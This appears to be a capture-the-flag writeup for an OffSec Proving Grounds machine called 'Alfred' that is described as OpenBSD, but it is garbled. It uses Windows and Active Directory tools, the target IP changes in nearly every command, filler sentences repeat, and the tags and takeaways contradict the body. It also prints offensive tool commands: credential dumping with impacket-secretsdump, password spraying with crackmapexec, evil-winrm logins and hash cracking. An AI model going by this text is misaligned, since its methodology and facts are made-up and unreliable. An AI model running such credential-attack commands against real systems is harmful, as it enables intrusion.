---
TitleSEO: "OffSec Proving Grounds — Alfred (Hard OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Alfred (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Alfred. Unquoted Service Path and CSRF to achieve hard compromise on OpenBSD."
Keywords: "tryhackme, hackthebox, windows, easy, ctf, hard"
URL: "https://zurefx.github.io/writeups/htb-alfred-527.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-alfred-527/"
Date: "2025-05-15"
Tags: "TryHackMe, HackTheBox, Windows, Easy, CTF, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-alfred-527"
Permalink: "/writeups/htb-alfred-527.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Alfred** is rated **Hard** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.116.215.165`.

### Objectives

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.45.88
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.122.114
```

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

```bash
nmap -sCV -p993,464,5986 10.124.81.227 -oN scan.txt
evil-winrm -i 10.24.152.61 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.75.234.3 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.121.180.195/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.47.88.36/FUZZ
nmap -sCV -p1433,9200,636 10.13.53.238 -oN scan.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

Key finding: **CSRF**.

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.125.84.27 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.104.29/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
gobuster dir -u http://10.15.74.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.150.101
impacket-secretsdump administrator:'P@ssw0rd!'@10.14.10.1
```

### Exploitation

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
crackmapexec smb 10.18.61.149 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.20.224.160/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.22.69.130 -u administrator -p 'P@ssw0rd!' --shares
```

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `psexec`
- `nikto`
- `wpscan`
- `bloodhound`
- `ligolo-ng`

### Key Takeaways

- Unquoted Service Path
- CSRF
- Sudo Misconfiguration
